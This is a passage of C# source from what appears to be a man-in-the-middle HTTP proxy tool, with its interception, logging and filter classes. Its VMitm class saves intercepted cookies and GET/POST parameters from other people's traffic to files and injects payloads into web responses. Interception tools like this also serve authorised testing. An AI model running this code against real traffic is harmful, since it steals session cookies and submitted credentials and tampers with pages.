        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                _helpFile = null;
                _libstateCache = 0;
                _lidstateCache = 0;
                _liistateCache = 0;
                pRestore = null;
                ctx = null;
                vf = null;
                dump = null;
                logger = null;
                vi = null;
                dw = null;
                console = null;
                Array.Clear(dumpServices, 0, dumpServices.Length);
                Array.Clear(blockServices, 0, blockServices.Length);
                Array.Clear(injectServices, 0, injectServices.Length);
                Array.Clear(srvFullName, 0, srvFullName.Length);
                Array.Clear(defs, 0, defs.Length);
                bState = null;
                dState = null;
                iState = null;
                dumpServices = null;
                injectServices = null;
                blockServices = null;
                defs = null;
                srvFullName = null;
            }

            disposed = true;
        }

        //IHelp Implementation

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //ISettigs Implementation

        private int _libstateCache = 0;
        private int _lidstateCache = 0;
        private int _liistateCache = 0;

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "state") started = (value == "true") ? true : false;
            if (key == "b_inc_state")
            {
                bState[_libstateCache] = (value == "true") ? true : false;
                _libstateCache++;
            }
            if (key == "d_inc_state")
            {
                dState[_lidstateCache] = (value == "true") ? true : false;
                _lidstateCache++;
            }
            if (key == "i_inc_state")
            {
                iState[_liistateCache] = (value == "true") ? true : false;
                _liistateCache++;
            }
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("state", (started) ? "true" : "false");
            //Add the states of the blocking services
            foreach (bool b in bState)
            {
                xml.WriteElementString("b_inc_state", (b) ? "true" : "false");
            }

            //Add the states of the dumping services
            foreach (bool d in dState)
            {
                xml.WriteElementString("d_inc_state", (d) ? "true" : "false");
            }

            foreach (bool i in iState)
            {
                xml.WriteElementString("i_inc_state", (i) ? "true" : "false");
            }

            xml.WriteEndElement();
        }

        //Main MITM class

        public bool started = true;
        public bool selfInteractive = false;
        public string pRestore = "";
        private Form1 ctx;
        private VFilter vf;
        private VDump dump;
        private VLogger logger;
        private VConsole console;
        private VDependencyWatcher dw;
        private VInject vi;
        String[] blockServices = { "mitm_hostblock", "mitm_ipblock", "mitm_bodyblock" };
        String[] dumpServices = { "mitm_cookie_dump", "mitm_getparams_dump", "mitm_postparams_dump", "mitm_url_dump", "mitm_setcookie_dump" };
        String[] injectServices = { "mitm_inject_core", "mitm_inject_auto", "mitm_inject_match", "mitm_inject_media" };
        List<bool> dState = new List<bool>();
        List<bool> bState = new List<bool>();
        List<bool> iState = new List<bool>();
        String[] srvFullName = { "Host Blocking", "IP Blocking", "Body Text based Blocking" };
        String[] defs = { "Blocks a server based on the requested hostname", "Blocks a server based on the resolved IPv4 Address", "Block a server based on the response body",
        "Dump Cookie headers sent by the client", "Dump GET request parameters", "Dump POST request Parameters", "Dump requested URLs", "Dump server response set-cookie headers",
        "Injection Core / Inject manager", "Injects the payload automatically to the response body", "Injects the payload based on a line-by-line matching to the response body",
        "Replaces media files based on the original URL"};

        public enum BlockServices : int
        {
            Host = 0,
            IP = 1,
            Body = 2,
            Undefined = -1
        }

        public enum DumpServices : int
        {
            Cookie = 0,
            GetParameters = 1,
            PostParameters = 2,
            Url = 3,
            SetCookie = 4,
            Undefined = -1
        }

        public enum InjectServices
        {
            Core = 0,
            AutoInjection = 1,
            MatchInjection = 2,
            MediaInjection = 3,
            Undefined = -1
        }

        public VMitm(Form1 context, VConsole con)
        {
            ctx = context;
            console = con;
            for (int i = 0; i < dumpServices.Length; i++)
            {
                dState.Add(false);
            }

            for (int i = 0; i < blockServices.Length; i++)
            {
                bState.Add(false);
            }

            for (int i = 0; i < injectServices.Length; i++)
            {
                iState.Add(false);
            }

            dw = ctx.VdwMod;
            dw.AddCondition(() => !IsAllOfflineD() && !dump.started, ctx.CreateLog("One or more dump service is active, but Dump Manager is not enabled", VLogger.LogLevel.warning));
        }

        /// <summary>
        /// Create all MITM related filters what you can configure by typing filter_manager and then use the setup command
        /// </summary>

        public void CreateFilters()
        {
            foreach (string s in blockServices)
            {
                string aFilter = s + "_white";
                string bFilter = s + "_black";
                vf.DestroyFilter(aFilter);
                vf.DestroyFilter(bFilter);
                vf.CreateFilter(aFilter);
                vf.CreateFilter(bFilter);
            }
        }

        /// <summary>
        /// Create all MITM related dumps (you can configure them in the dump_manager menu)
        /// </summary>

        public void CreateDumps()
        {
            if (dump != null && dump.started)
            {
                if (dump.Dir == "") dump.DefineDirectory(Application.StartupPath + "\\dumps");
                dump.AddFile("parameter_dump.txt", "mitm_parameter_store", false);
                dump.AddFile("cookie_dump.txt", "mitm_cookie_store", false);
                dump.AddFile("url_dump.txt", "mitm_url_store", false);
            }
            else
            {
                logger.Log("Dump Manager is not available!", VLogger.LogLevel.error);
            }
        }

        /// <summary>
        /// Create All MITM related injects (you can configure them in mitm/inject_manager)
        /// </summary>

        public void CreateInjects()
        {
            if (vi != null)
            {
                VRegEx r = vi.Rxmanager;
                r.Add("mitm_inject_match_and");
                r.Add("mitm_inject_macth_or");
                vf.CreateFilter("mitm_inject_match_and");
                vf.CreateFilter("mitm_inject_match_or");
            }
        }

        /// <summary>
        /// Check for filter related errors
        /// </summary>
        /// <returns>String Array of error messages</returns>

        public String[] CheckBlockers()
        {
            List<string> errors = new List<string>();
            int loopIndex = 0;

            foreach (string s in blockServices)
            {
                //Black - White list related issues
                bool hostb = vf.IsFilterEmpty(s + "_black");
                bool hostw = vf.IsFilterEmpty(s + "_white");
                if (!hostb && !hostw) errors.Add("Both black & white list contains values for " + srvFullName[loopIndex] + " function, clear one list");
                if ((!hostb || !hostw) && !bState[loopIndex]) errors.Add("W: " + srvFullName[loopIndex] + " service filters are setup, but the service is turned off");
                loopIndex++;
            }

            return errors.ToArray();
        }

        /// <summary>
        /// Check's for dumper related errors
        /// </summary>
        /// <returns>String array of error messages</returns>

        public String[] CheckDumpers()
        {
            List<string> errors = new List<string>();
            if (dump == null || !dump.started) errors.Add("Dump manager service is not available");
            if ((CheckServiceState(DumpServices.Cookie) || CheckServiceState(DumpServices.SetCookie)) && !dump.CheckFileByFriendlyName("mitm_cookie_store"))
                errors.Add("W: Dumpers set to dump cookies, but the store file doesn't exists, or it's not loaded to Dump manager");
            if ((CheckServiceState(DumpServices.GetParameters) || CheckServiceState(DumpServices.PostParameters)) && !dump.CheckFileByFriendlyName("mitm_parameter_store"))
                errors.Add("W: Dumpers set to dump parameters, but the store file doesn't exists, or it's not loaded to Dump manager");
            if (CheckServiceState(DumpServices.Url) && !dump.CheckFileByFriendlyName("mitm_url_store"))
                errors.Add("W: Dumpers set to dump urls, but the store file doesn't exists, or it's not loaded to Dump manager");

            return errors.ToArray();
        }

        /// <summary>
        /// Check's if a host need's to be blocked based on HostName
        /// </summary>
        /// <param name="httpRequest">The current Request object</param>
        /// <returns>True if host need's to be blocked</returns>

        public bool CheckHost(Request httpRequest)
        {
            string host = httpRequest.headers["Host"];
            bool serviceState = CheckServiceState(BlockServices.Host);
            if (!serviceState) return false;
            bool result = false;
            if (vf.IsFilterEmpty("mitm_hostblock_white")) result = vf.RunAllCompareOr("mitm_hostblock_black", host);
            else result = !vf.RunAllCompareOr("mitm_hostblock_white", host); //revert the value, because we don't want to block whitelisted hosts
            return result;
        }

        /// <summary>
        /// Check's if a server need's to be blocked based on IPv4 address
        /// </summary>
        /// <param name="ipAddress">The ip address of the target server</param>
        /// <returns>True if the server need's to be blocked</returns>

        public bool CheckIP(string ipAddress)
        {
            bool serviceState = CheckServiceState(BlockServices.IP);
            if (!serviceState) return false;
            bool result = false;
            if (vf.IsFilterEmpty("mitm_ipblock_white")) result = vf.RunAllCompareOr("mitm_ipblock_black", ipAddress);
            else result = !vf.RunAllCompareOr("mitm_ipblock_white", ipAddress); //revert the value, because we don't want to block whitelisted hosts
            return result;
        }

        /// <summary>
        /// Check's if a page need's to be blocked based on the text of the response body
        /// </summary>
        /// <param name="bodyText">The body text of a response object</param>
        /// <returns>True if page need's to be blocked</returns>

        public bool CheckBody(string bodyText)
        {
            bool serviceState = CheckServiceState(BlockServices.Body);
            if (!serviceState) return false;
            bool result = false;
            if (vf.IsFilterEmpty("mitm_bodyblock_white")) result = vf.RunAllCompareOr("mitm_bodyblock_black", bodyText);
            else result = !vf.RunAllCompareOr("mitm_bodyblock_white", bodyText); //revert the value, because we don't want to block whitelisted hosts
            return result;
        }

        /// <summary>
        /// Dump all data selected based on a Request object using VDump class
        /// </summary>
        /// <param name="r">The current request object</param>

        public void DumpRequest(Request r)
        {
            if (!IsAllOfflineD())
            {
                string fullParameterDump = "";
                string fullCookieDump = "";
                string fullUrlDump = "";
                bool pDataWritten = false;
                bool cDataWritten = false;
                bool uDataWritten = false;

                if (CheckServiceState(DumpServices.Cookie) && r.headers.ContainsKey("Cookie"))
                {
                    string cLine = r.headers["Cookie"];

                    if (cLine.Contains(";"))
                    {
                        foreach (string cookie in cLine.Split(';'))
                        {
                            string key = cookie.Split('=')[0];
                            string value = cookie.Split('=')[1];
                            string full = "Cookie:\r\nKey: " + key + "\r\nValue: " + value + "\r\n";
                            fullCookieDump += full;
                            if (!cDataWritten) cDataWritten = true;
                        }
                    }
                    else
                    {
                        string key = cLine.Split('=')[0];
                        string value = cLine.Split('=')[1];
                        string full = "Cookie:\r\nKey: " + key + "\r\nValue: " + value + "\r\n";
                        fullCookieDump += full;
                        cDataWritten = true;
                    }
                }

                if (CheckServiceState(DumpServices.GetParameters))
                {
                    string url = r.target;
                    if (r.target.Contains("?"))
                    {
                        string gp = r.target.Substring(r.target.IndexOf('?') + 1);
                        fullParameterDump += "[GET] Parameters:\r\n";
                        if (gp.Contains("&"))
                        {
                            foreach (string p in gp.Split('&'))
                            {
                                string key = p.Split('=')[0];
                                string value = p.Split('=')[1];
                                string full = "Key: " + key + "\r\nValue: " + value + "\r\n";
                                fullParameterDump += full;
                                if (!pDataWritten) pDataWritten = true;
                            }
                        }
                        else
                        {
                            string key = gp.Split('=')[0];
                            string value = gp.Split('=')[1];
                            string full = "Key: " + key + "\r\nValue: " + value + "\r\n";
                            fullParameterDump += full;
                            pDataWritten = true;
                        }
                    }
                }

                if (CheckServiceState(DumpServices.PostParameters))
                {
                    if (r.headers.ContainsKey("Content-Type"))
                    {
                        string cType = r.headers["Content-Type"];
                        if (cType == "application/x-www-form-urlencoded")
                        {
                            string pp = r.htmlBody;
                            fullParameterDump += "[POST] Parameters:\r\n";
                            if (pp.Contains("&"))
                            {
                                foreach (string p in pp.Split('&'))
                                {
                                    string key = p.Split('=')[0];
                                    string value = p.Split('=')[1];
                                    string full = "Key: " + key + "\r\nValue: " + value + "\r\n";
                                    fullParameterDump += full;
                                    if (!pDataWritten) pDataWritten = true;
                                }
                            }
                            else
                            {
                                string key = pp.Split('=')[0];
                                string value = pp.Split('=')[1];
                                string full = "Key: " + key + "\r\nValue: " + value + "\r\n";
                                fullParameterDump += full;
                                pDataWritten = true;
                            }
                        }
                    }
                }

                if (CheckServiceState(DumpServices.Url))
                {
                    string url = r.target;
                    if (url != "")
                    {
                        fullUrlDump += "URL: " + url + "\r\n";
                        uDataWritten = true;
                    }
                }

                string time = DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString();
                string target = r.target;

                if (target.Contains("?")) target = target.Substring(0, target.IndexOf("?"));

                if (cDataWritten)
                {
                    fullCookieDump = time + " -- " + target + "\r\n" + fullCookieDump + "\r\n";
                    dump.Dump(fullCookieDump, "mitm_cookie_store");
                }

                if (pDataWritten)
                {
                    fullParameterDump = time + " -- " + target + "\r\n" + fullParameterDump + "\r\n";
                    dump.Dump(fullParameterDump, "mitm_parameter_store");
                }

                if (uDataWritten)
                {
                    fullUrlDump = time + "\r\n" + fullUrlDump + "\r\n";
                    dump.Dump(fullUrlDump, "mitm_url_store");
                }
            }
        }

        /// <summary>
        /// Dump all data selected based on a Response object using VDump class
        /// </summary>
        /// <param name="r">The current Response object</param>
        /// <param name="senderUrl">The url of the page requested</param>

        public void DumpResponse(Response r, string senderUrl)
        {
            if (IsAllOfflineD()) return;
            string fullCookieDump = "";
            bool cDataWritten = false;

            if (CheckServiceState(DumpServices.SetCookie))
            {
                //Can send multiple Set-Cookie headers
                if (!r.headers.ContainsKey("Set-Cookie")) return;
                string[] schs = ctx.Ie2sa(r.headers.GetMultipleItems("Set-Cookie"));
                foreach (string sc in schs)
                {
                    string cookie = "";
                    if (sc.Contains(";")) cookie = sc.Substring(0, sc.IndexOf(';'));
                    else cookie = sc;
                    string key = cookie.Split('=')[0];
                    string value = cookie.Split('=')[1];
                    fullCookieDump += "Set Cookie:\r\nKey: " + key + " Value: " + value + "\r\n";
                    if (!cDataWritten) cDataWritten = true;
                }
            }

            if (cDataWritten)
            {
                string time = DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString();

                if (cDataWritten)
                {
                    fullCookieDump = time + " -- " + senderUrl + "\r\n" + fullCookieDump + "\r\n";
                    dump.Dump(fullCookieDump, "mitm_cookie_store");
                }
            }
        }

        /// <summary>
        /// Inject the setup payloads to responses (auto or match injection)
        /// </summary>
        /// <param name="rBody">The original response text</param>
        /// <param name="responseType">The Content-Type header</param>
        /// <returns>string to replace to original content with</returns>

        public string Inject(string rBody, string responseType)
        {
            if (rBody == null || rBody == "" || !CheckServiceState(InjectServices.Core)) return null;

            if (CheckServiceState(InjectServices.AutoInjection))
            {
                VInject.Mode m = VInject.Mode.CSS;
                if (responseType.Contains("javascript")) m = VInject.Mode.Javascript;
                else if (responseType.Contains("CSS")) m = VInject.Mode.CSS;
                else m = VInject.Mode.HTML;
                string infected = vi.AutoInject(rBody, vi.autoPayload, m);
                return infected;
            }

            if (CheckServiceState(InjectServices.MatchInjection))
            {
                string pload = vi.GetCurrentPayload();
                if (pload == null) return null;
                string infected = vi.MatchAndInject(rBody, pload, vi.mMode, vi.mOption);
                return infected;
            }

            return null;
        }

        /// <summary>
        /// Does injection with mediaReplace
        /// </summary>
        /// <param name="resp">The current response object</param>
        /// <param name="req">The current request object</param>
        /// <returns>byte array of new media</returns>

        public byte[] MediaRewrite(Response resp, Request req)
        {
            if (resp.bodyText != "" || resp.fullBytes.Length == 0) return null;
            if (!resp.headers.ContainsKey("Content-Type")) return null;
            string mime = resp.headers["Content-Type"];
            bool mimeFilter = vf.RunAllCompareOr("mitm_mime_media", mime);
            if (!mimeFilter) return null;
            else
            {
                bool response = vi.MediaReplace(req, vi.filePathOption);
                if (response)
                {
                    byte[] result = vi.GetMediaHijack(req);
                    return result;
                }
                else return null;
            }
        }

        //Service Related

        public void ListServices()
        {
            int pIndex = 0;

            for (int i = 0; i < blockServices.Length; i++)
            {
                string sName = blockServices[i];
                console.WriteLine(sName + " - " + defs[pIndex], "ig.mitm");
                pIndex++;
            }

            for (int i = 0; i < dumpServices.Length; i++)
            {
                string sName = dumpServices[i];
                console.WriteLine(sName + " - " + defs[pIndex], "ig.mitm");
                pIndex++;
            }

            for (int i = 0; i < injectServices.Length; i++)
            {
                string sName = injectServices[i];
                console.WriteLine(sName + " - " + defs[pIndex], "ig.mitm");
                pIndex++;
            }
        }

        public bool CheckServiceState(BlockServices service)
        {
            int sid = (int)service;
            bool state = bState[sid];
            if (service == BlockServices.Undefined)
            {
                logger.Log("Invalid service name specified!", VLogger.LogLevel.error);
            }
            return state;
        }

        public bool CheckServiceState(DumpServices service)
        {
            int sid = (int)service;
            bool state = dState[sid];
            if (service == DumpServices.Undefined)
            {
                logger.Log("Invalid service name specified!", VLogger.LogLevel.error);
            }
            return state;
        }

        public bool CheckServiceState(InjectServices service)
        {
            if (service == InjectServices.Undefined)
            {
                logger.Log("Invalid service name!", VLogger.LogLevel.error);
                return false;
            }

            int sid = (int)service;
            return iState[sid];
        }

        public void SetServiceState(BlockServices service, bool state)
        {
            int sid = (int)service;
            bState[sid] = state;
            string srvName = blockServices[sid].Substring(4);
            logger.Log("MITM" + srvName + " set to " + ((state) ? "Enabled" : "Disabled"), VLogger.LogLevel.service);
        }

        public void SetServiceState(DumpServices service, bool state)
        {
            int sid = (int)service;
            dState[sid] = state;
            string srvName = dumpServices[sid].Substring(4);
            logger.Log("MITM" + srvName + " set to " + ((state) ? "Enabled" : "Disabled"), VLogger.LogLevel.service);
        }

        public void SetServiceState(InjectServices service, bool state)
        {
            if (service == InjectServices.Undefined)
            {
                logger.Log("Invalid Service name!", VLogger.LogLevel.error);
                return;
            }

            int sid = (int)service;
            iState[sid] = state;
        }

        public bool IsSetServiceCommand(string input)
        {
            string srvString = "";
            if (input.Contains(" ")) srvString = input.Split(' ')[0];
            else srvString = input;

            foreach (string bs in blockServices)
            {
                if (srvString.ToLower() == bs) return true;
            }

            foreach (string ds in dumpServices)
            {
                if (srvString.ToLower() == ds) return true;
            }

            foreach (string iS in injectServices)
            {
                if (srvString.ToLower() == iS) return true;
            }

            return false;
        }

        private bool IsAllOfflineD()
        {
            foreach (bool b in dState)
            {
                if (b == true) return false;
            }

            return true;
        }

        private bool IsAllOfflineB()
        {
            foreach (bool b in bState)
            {
                if (b) return false;
            }

            return true;
        }

        public bool IsAllOfflineI()
        {
            foreach (bool b in iState)
            {
                if (b) return false;
            }

            return true;
        }

        public void SetManager(VFilter vfman)
        {
            vf = vfman;
        }

        public void SetDumpManager(VDump dmp)
        {
            dump = dmp;
        }

        public void SetInjectionManager(VInject inject)
        {
            vi = inject;
        }
        
        public void SetLogger(VLogger lg)
        {
            logger = lg;
        }

        public string ServiceToString(BlockServices input)
        {
            int sid = (int)input;
            return blockServices[sid];
        }

        public string ServiceToString(DumpServices input)
        {
            int sid = (int)input;
            return dumpServices[sid];
        }

        public string ServiceToString(InjectServices input)
        {
            int sid = (int)input;
            return injectServices[sid];
        }

        public void ListAll(string state)
        {
            state = state.ToLower();
            int index = 0;
            if (state == "online")
            {
                bool written = false;
                console.Write("\r\n");

                foreach (string s in blockServices)
                {
                    if (bState[index])
                    {
                        console.Write("MITM" + s.Substring(4) + ", ");
                        if (!written) written = true;
                    }
                    index++;
                }

                index = 0;

                foreach (string s in dumpServices)
                {
                    if (dState[index])
                    {
                        console.Write("MITM" + s.Substring(4) + ", ");
                        if (!written) written = true;
                    }
                    index++;
                }

                index = 0;

                foreach (string s in injectServices)
                {
                    if (iState[index])
                    {
                        if (injectServices.Length - 1 > index) console.Write("MITM" + s.Substring(4) + ", ");
                        else console.Write("MITM" + s.Substring(4));
                        if (!written) written = true;
                    }

                    index++;
                }

                if (!written) console.WriteLine("No services are online at this moment!", console.GetIntercativeGroup());

                if (written) console.Write("\r\n");
            }
            else if (state == "offline")
            {
                bool written = false;
                console.Write("\r\n");

                foreach (string s in blockServices)
                {
                    if (!bState[index])
                    {
                        console.Write("MITM" + s.Substring(4) + ", ");
                        if (!written) written = true;
                    }
                    index++;
                }

                index = 0;

                foreach (string s in dumpServices)
                {
                    if (!dState[index])
                    {
                        console.Write("MITM" + s.Substring(4) + ", ");
                        if (!written) written = true;
                    }
                    index++;
                }

                index = 0;

                foreach (string s in injectServices)
                {
                    if (!iState[index])
                    {
                        if (injectServices.Length - 1 > index) console.Write("MITM" + s.Substring(4) + ", ");
                        else console.Write("MITM" + s.Substring(4));
                        if (!written) written = true;
                    }
                    index++;
                }

                if (!written) console.WriteLine("No services are offline at this moment!", console.GetIntercativeGroup());

                if (written) console.Write("\r\n");
            }
            else
            {
                logger.Log("Invalid state parameter!", VLogger.LogLevel.error);
            }
        }

        public BlockServices StringToBService(string input)
        {
            int currentIndex = 0;
            bool ciSet = false;

            foreach (string s in blockServices)
            {
                if (s == input.ToLower())
                {
                    ciSet = true;
                    break;
                }
                currentIndex++;
            }

            if (ciSet) return (BlockServices)currentIndex;
            else return BlockServices.Undefined;
        }

        public DumpServices StringToDService(string input)
        {
            int currentIndex = 0;
            bool ciSet = false;

            foreach (string s in dumpServices)
            {
                if (s == input.ToLower())
                {
                    ciSet = true;
                    break;
                }
                currentIndex++;
            }

            if (ciSet) return (DumpServices)currentIndex;
            else return DumpServices.Undefined;
        }

        public InjectServices StringToIService(string input)
        {
            int currentIndex = 0;
            bool ciSet = false;

            foreach (string s in injectServices)
            {
                if (s == input.ToLower())
                {
                    ciSet = true;
                    break;
                }
                currentIndex++;
            }

            if (ciSet) return (InjectServices)currentIndex;
            else return InjectServices.Undefined;
        }
    }

    public class VLogger : IFilter, ISettings, IHelp, IDisposable
    {
        //Implement IDisposable

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                _helpFile = null;
                filterNames.Clear();
                filterNames = null;
                _vfmanager = null;
                console = null;
                file = null;
                pRestore = null;
            }

            disposed = true;
        }

        //Implement IHelp

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //Implement ISettigns

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "logger_file_state") printToFile = (value == "true") ? true : false;
            if (key == "logger_file_path") SetFile(kvp.Value);
            if (key == "logger_state") started = (value == "true") ? true : false;
            if (key == "logger_rest_rules") StringToRest(kvp.Value);
            if (key == "logger_bind_filter") PullBindInfo(kvp.Value);
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("logger_file_state", (printToFile) ? "true" : "false");
            xml.WriteElementString("logger_file_path", file);
            xml.WriteElementString("logger_state", (started) ? "true" : "false");
            string loggerRules = RestToString();
            xml.WriteElementString("logger_rest_rules", loggerRules);
            xml.WriteElementString("logger_bind_filter", PushBindInfo());
            xml.WriteEndElement();
        }

        //Implement IFilter interface

        private Dictionary<string, object> filterNames = new Dictionary<string, object>();
        private VFilter _vfmanager;

        public Dictionary<string, object> filterName
        {
            get { return filterNames; }
            set { filterNames = value; }
        }

        public VFilter manager
        {
            get { return _vfmanager; }
            set { _vfmanager = value; }
        }

        public string PushBindInfo()
        {
            string info = "";

            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                string part2 = LogLevelToString(((LogLevel)kvp.Value));
                info += kvp.Key + ":" + part2 + ";";
            }

            if (info.Length > 0) info = info.Substring(0, info.Length - 1);

            return info;
        }

        public void PullBindInfo(string info)
        {
            if (info == "") return;
            String[] kvp = info.Split(';');
            foreach (String pairs in kvp)
            {
                string[] kvp2 = pairs.Split(':');
                LogLevel level = StringToLogLevel(kvp2[1]);
                string name = kvp2[0];
                filterNames.Add(name, level);
            }
        }

        public bool BindFilter(string validFilterName, object input)
        {
            LogLevel op = (LogLevel)input;
            if (op != LogLevel.request && op != LogLevel.response) return false;
            filterNames.Add(validFilterName, op);
            return true;
        }

        public bool SearchFilter(string sMethod, object searchParam, string input)
        {
            LogLevel p = (LogLevel)searchParam;
            string targetFilterName = "";
            foreach (KeyValuePair<string, object> pair in filterNames)
            {
                LogLevel comp = (LogLevel)pair.Value;
                if (comp == p)
                {
                    targetFilterName = pair.Key;
                    break;
                }
            }

            if (targetFilterName == "")
            {
                return true; // if target filter is not found output the text, perhaps there is no filter for a specific object
            }

            if (sMethod == "and")
            {
                return manager.RunAllCompareAnd(targetFilterName, input);
            }
            else if (sMethod == "or")
            {
                return manager.RunAllCompareOr(targetFilterName, input);
            }
            else
            {
                console.WriteLine("[ERROR] Invalid SearchFilter option sMethod", console.GetIntercativeGroup());
                return true;
            }
        }

        public bool UnBindFilter(string validFilterName)
        {
            if (!filterName.ContainsKey(validFilterName)) return false;
            filterName.Remove(validFilterName);
            return true;
        }

        public void BindList()
        {
            WriteLine("=========Start Of bind list=========");
            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                LogLevel ll = (LogLevel)kvp.Value;
                WriteLine(kvp.Key + ":\t" + LogLevelToString(ll));
            }
            WriteLine("==========End Of bind list==========");
        }

        public void SetManager(VFilter fman)
        {
            manager = fman;
        }

        //Main logger class

        VConsole console;
        bool printRequest = false;
        bool printResponse = false;
        bool printWarning = false;
        bool printError = false;
        bool printService = false;
        public bool printToFile = true;
        public bool started = false;
        public string file { get; private set; } = "";
        public string pRestore = "";
        public bool selfInteractive = false;

        public enum LogLevel : int
        {
            information = 0,
            warning = 1,
            error = 2,
            service = 3,
            request = 4,
            response = 5,
            unknown = 6
        }

        public struct LogObj
        {
            public string message;
            public LogLevel ll;
            public Request r;
            public Response resp; 
        }

        public VLogger(VConsole con)
        {
            console = con;
        }

        public void SetupLogLevel(bool err, bool war, bool srv, bool req, bool resp)
        {
            printError = err;
            printWarning = war;
            printService = srv;
            printRequest = req;
            printResponse = resp;
        }

        public void StringToRest(string rest)
        {
            printError = false;
            printWarning = false;
            printService = false;
            printRequest = false;
            printResponse = false;
            String[] rst = rest.Split(',');
            foreach (string r in rst)
            {
                if (r == "e") printError = true;
                if (r == "w") printWarning = true;
                if (r == "s") printService = true;
                if (r == "rq") printRequest = true;
                if (r == "rs") printResponse = true;
            }
        }

        public string RestToString()
        {
            string list = "";
            if (printError) list += "e,";
            if (printWarning) list += "w,";
            if (printService) list += "s,";
            if (printRequest) list += "rq,";
            if (printResponse) list += "rs,";
            list = list.Substring(0, list.Length - 1);
            return list;
        }

        public void SetFile(string filename)
        {
            if (filename == "") return;
            string logDir = Application.StartupPath + "\\Logs";
            string logFile = logDir + "\\" + filename;
            if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
            if (!File.Exists(logFile))
            {
                using (FileStream fs = File.Create(logFile)) ;
            }

            file = logFile;
        }

        public void WriteLine(string text)
        {
            if (selfInteractive) console.WriteLine(text, "ig.logger");
            else console.WriteLine(text, console.GetIntercativeGroup());
        }

        public void WriteFile(string text)
        {
            if (File.Exists(file) && printToFile && started)
            {
                string prev = File.ReadAllText(file);
                string next = prev + Environment.NewLine + text;
                File.WriteAllText(file, next);
            }
        }

        public void Log(string text, LogLevel level, Request r = null, Response re = null)
        {
            if (!started)
            {
                WriteLine(text);
                return;
            }

            string data = "";

            if (level == LogLevel.error)
            {
                data = "[ERROR] " + text;

                bool sfResult = SearchFilter("and", LogLevel.error, data);

                if (printError && sfResult)
                {
                    WriteLine(data);
                    WriteFile(data);
                }
            }

            if (level == LogLevel.warning)
            {
                data = "[WARNING] " + text;

                bool sfResult = SearchFilter("and", LogLevel.warning, data);

                if (printWarning && sfResult)
                {
                    WriteLine(data);
                    WriteFile(data);
                }
            }

            if (level == LogLevel.service)
            {
                data = "[SERVICE] " + text;

                bool sfResult = SearchFilter("and", LogLevel.service, data);

                if (printService && sfResult)
                {
                    WriteLine(data);
                    WriteFile(data);
                }
            }

            if (level == LogLevel.request)
            {
                if (r == null)
                {
                    data = "[REQUEST] " + text;
                }
                else
                {
                    data = "[REQUEST: " + r.method + "] ";
                    text = text.Replace("<method>", r.method);
                    text = text.Replace("<target>", r.target);
                    data += text;
                }

                bool sfResult = SearchFilter("and", LogLevel.request, data);

                if (printRequest && sfResult)
                {
                    WriteLine(data);
                    WriteFile(data);
                }
            }

            if (level == LogLevel.response)
            {
                if (re == null)
                {
                    data = "[RESPONSE] " + text;
                }
                else
                {
                    data = "[RESPONSE: " + re.statusCode + " " + re.httpMessage + "] ";
                    text = text.Replace("<code>", re.statusCode.ToString());
                    text = text.Replace("<version>", re.version);
                    text = text.Replace("<message>", re.httpMessage);
                    data += text;
                }

                bool sfResult = SearchFilter("and", LogLevel.response, data);

                if (printResponse && sfResult)
                {
                    WriteLine(data);
                    WriteFile(data);
                }
            }

            if (level == LogLevel.information)
            {
                data = text;
                bool sfResult = SearchFilter("and", LogLevel.information, data);
                if (!sfResult) return;
                WriteLine(data);
                WriteFile(data);
            }
        }

        //LogLevel converters

        public static LogLevel StringToLogLevel(string input)
        {
            input = input.ToLower();
            if (input == "error") return LogLevel.error;
            if (input == "warning") return LogLevel.warning;
            if (input == "service") return LogLevel.service;
            if (input == "request") return LogLevel.request;
            if (input == "response") return LogLevel.response;
            if (input == "information") return LogLevel.information;
            return LogLevel.unknown;
        }

        public static string LogLevelToString(LogLevel input)
        {
            if (input == LogLevel.error) return "error";
            if (input == LogLevel.warning) return "warning";
            if (input == LogLevel.service) return "service";
            if (input == LogLevel.request) return "request";
            if (input == LogLevel.response) return "response";
            if (input == LogLevel.information) return "information";
            return null;
        }
    }

    public class VFilter : IDisposable, ISettings, IHelp
    {
        //Implement IHelp

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //Implement ISettings

        private string _lfnameCache = "";
        private Operation _lopCache = Operation.Undefined;

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "filter_state") started = (value == "true") ? true : false;
            if (key == "f_name")
            {
                _lfnameCache = kvp.Value;
                CreateFilter(kvp.Value);
            }

            if (key == "f_equal") _lopCache = Operation.Equals;
            if (key == "f_starts_with") _lopCache = Operation.StartsWith;
            if (key == "f_contains") _lopCache = Operation.Contains;
            if (key == "f_not_equal") _lopCache = Operation.NotEquals;
            if (key == "f_rule")
            {
                Addfilter(_lfnameCache, _lopCache, kvp.Value);
            }
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
